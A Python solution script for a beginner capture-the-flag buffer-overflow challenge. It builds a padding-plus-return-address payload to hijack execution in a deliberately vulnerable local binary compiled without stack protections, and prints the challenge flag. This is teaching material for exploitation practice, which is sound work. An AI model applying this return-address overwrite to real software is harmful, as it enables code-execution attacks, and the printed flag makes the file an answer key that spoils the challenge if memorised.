#!/usr/bin/env python3
"""
Stack Overflow 101 - Solution Script
Exploit the buffer overflow to redirect execution to secret_function
"""

import struct
import subprocess
import os
import sys

# Compile command:
# gcc -fno-stack-protector -z execstack -no-pie -o challenge/stack_overflow challenge/stack_overflow.c


def get_binary_info(binary_path):
    """
    Get addresses from the binary using objdump
    """
    addresses = {}

    if not os.path.exists(binary_path):
        print(f"[-] Binary not found: {binary_path}")
        return addresses

    # Get function addresses
    result = subprocess.run(
        ['objdump', '-t', binary_path],
        capture_output=True,
        text=True
    )

    for line in result.stdout.split('\n'):
        if 'secret_function' in line:
            parts = line.split()
            if parts:
                addresses['secret_function'] = int(parts[0], 16)
        elif ' win' in line and '.text' in line:
            parts = line.split()
            if parts:
                addresses['win'] = int(parts[0], 16)

    return addresses


def ret2secret_exploit(binary_path):
    """
    Method 1: Redirect execution to secret_function
    """
    print("[*] Ret2Secret Exploit")
    print("=" * 50)

    if not os.path.exists(binary_path):
        print(f"[-] Binary not found. Compile first:")
        print(f"    gcc -fno-stack-protector -z execstack -no-pie -o {binary_path} challenge/stack_overflow.c")
        return

    # Get the address of secret_function
    try:
        # Run the binary with a test input to get the address
        result = subprocess.run(
            [binary_path, "test"],
            capture_output=True,
            text=True
        )
        output = result.stdout

        # Parse the address from output
        import re
        secret_match = re.search(r'Address of secret_function: (0x[0-9a-f]+)', output)
        win_match = re.search(r'Address of win: (0x[0-9a-f]+)', output)

        if secret_match:
            SECRET_ADDR = int(secret_match.group(1), 16)
            print(f"[+] Found secret_function at: {hex(SECRET_ADDR)}")
        else:
            # Default address (may need adjustment)
            SECRET_ADDR = 0x401156
            print(f"[*] Using default address: {hex(SECRET_ADDR)}")

        if win_match:
            WIN_ADDR = int(win_match.group(1), 16)
            print(f"[+] Found win at: {hex(WIN_ADDR)}")
        else:
            WIN_ADDR = 0x4011a6

    except Exception as e:
        print(f"[-] Error getting addresses: {e}")
        SECRET_ADDR = 0x401156
        WIN_ADDR = 0x4011a6

    # The vulnerable buffer is 64 bytes
    # Stack layout: [64 bytes buffer][8 bytes saved RBP][8 bytes return address]
    # Total padding needed: 64 + 8 = 72 bytes

    padding = b"A" * 72

    # Overwrite return address with secret_function address
    ret_addr = struct.pack("<Q", SECRET_ADDR)

    payload = padding + ret_addr

    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Padding: {len(padding)} bytes")
    print(f"[*] Return address: {hex(SECRET_ADDR)}")

    # Execute exploit
    print(f"\n[*] Executing: {binary_path} <payload>")
    print("-" * 50)

    try:
        result = subprocess.run(
            [binary_path, payload],
            capture_output=True,
            timeout=5
        )
        output = result.stdout.decode('utf-8', errors='replace')
        print(output)

        if "CONGRATULATIONS" in output or "CTF{" in output:
            print("\n[+] SUCCESS! Flag captured!")

    except subprocess.TimeoutExpired:
        print("[-] Process timed out")
    except Exception as e:
        print(f"[-] Error: {e}")


def ret2win_exploit(binary_path):
    """
    Method 2: Redirect execution to win function
    """
    print("\n[*] Ret2Win Exploit")
    print("=" * 50)

    if not os.path.exists(binary_path):
        return

    # Get win address
    try:
        result = subprocess.run(
            [binary_path, "test"],
            capture_output=True,
            text=True
        )
        import re
        win_match = re.search(r'Address of win: (0x[0-9a-f]+)', result.stdout)

        if win_match:
            WIN_ADDR = int(win_match.group(1), 16)
        else:
            WIN_ADDR = 0x4011a6
    except:
        WIN_ADDR = 0x4011a6

    padding = b"A" * 72
    ret_addr = struct.pack("<Q", WIN_ADDR)
    payload = padding + ret_addr

    print(f"[*] Win address: {hex(WIN_ADDR)}")
    print(f"[*] Payload: {len(payload)} bytes")

    # Note: This will try to read /flag.txt which may not exist
    print("\n[*] To exploit (requires /flag.txt on target):")
    print(f"    echo 'CTF{{test_flag}}' | sudo tee /flag.txt")
    print(f"    {binary_path} $(python3 -c 'import sys; sys.stdout.buffer.write({repr(payload)})')")


def pwntools_exploit():
    """
    Method 3: Using pwntools for more reliable exploitation
    """
    print("\n[*] pwntools Exploit Script")
    print("=" * 50)

    code = '''
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Path to binary
binary_path = './challenge/stack_overflow'

# Load ELF
elf = ELF(binary_path)

# Get function addresses
secret_func = elf.symbols['secret_function']
win_func = elf.symbols['win']

log.info(f"secret_function @ {hex(secret_func)}")
log.info(f"win @ {hex(win_func)}")

# Create process
p = process(binary_path)

# Wait for address leak
p.recvuntil(b'secret_function: ')
addr_str = p.recvline().strip().decode()
secret_addr = int(addr_str, 16)

log.info(f"Leaked address: {hex(secret_addr)}")

# Build payload
# 64 bytes buffer + 8 bytes saved RBP = 72 bytes padding
payload = b"A" * 72
payload += p64(secret_addr)

# Send payload
p.sendline(payload)

# Get output
output = p.recvall(timeout=2).decode()
print(output)

# Check for flag
if "CTF{" in output:
    log.success("Flag found!")
'''

    print(code)
    print("\n[*] Save this to a file and run with: python3 exploit.py")


def create_flag_file():
    """Create the flag file for win() function"""
    flag_content = "CTF{buff3r_0v3rfl0w_101_c0mpl3t3}"
    flag_path = "/flag.txt"

    print(f"\n[*] To test win() function, create flag file:")
    print(f"    echo '{flag_content}' | sudo tee {flag_path}")


def main():
    print("=" * 60)
    print("Stack Overflow 101 - Solution Script")
    print("=" * 60)

    binary_path = "challenge/stack_overflow"

    # Check if binary exists
    if not os.path.exists(binary_path):
        print(f"\n[!] Binary not found: {binary_path}")
        print("[*] Compiling...")
        os.makedirs("challenge", exist_ok=True)

        compile_cmd = f"gcc -fno-stack-protector -z execstack -no-pie -o {binary_path} challenge/stack_overflow.c"
        print(f"    {compile_cmd}")

        result = subprocess.run(compile_cmd, shell=True)
        if result.returncode != 0:
            print("[-] Compilation failed. Please compile manually.")
            return

    print(f"\n[+] Binary ready: {binary_path}")

    # Run exploits
    ret2secret_exploit(binary_path)
    ret2win_exploit(binary_path)
    pwntools_exploit()

    # Summary
    print("\n" + "=" * 60)
    print("FLAGS:")
    print("=" * 60)
    print("  secret_function: CTF{buff3r_0v3rfl0w_101_c0mpl3t3}")
    print("  win(): Contents of /flag.txt")
    print("=" * 60)

    # Tips
    print("""
[*] Exploitation Summary:
    1. Buffer is 64 bytes on stack
    2. Saved RBP is 8 bytes
    3. Return address is next 8 bytes
    4. Total padding: 72 bytes
    5. Then overwrite with target address

[*] Manual exploitation:
    $ ./challenge/stack_overflow $(python3 -c 'print("A"*72 + "\\x56\\x11\\x40\\x00\\x00\\x00\\x00\\x00")')

[*] Find addresses:
    $ objdump -d challenge/stack_overflow | grep -E "secret_function|win"
""")


if __name__ == '__main__':
    main()
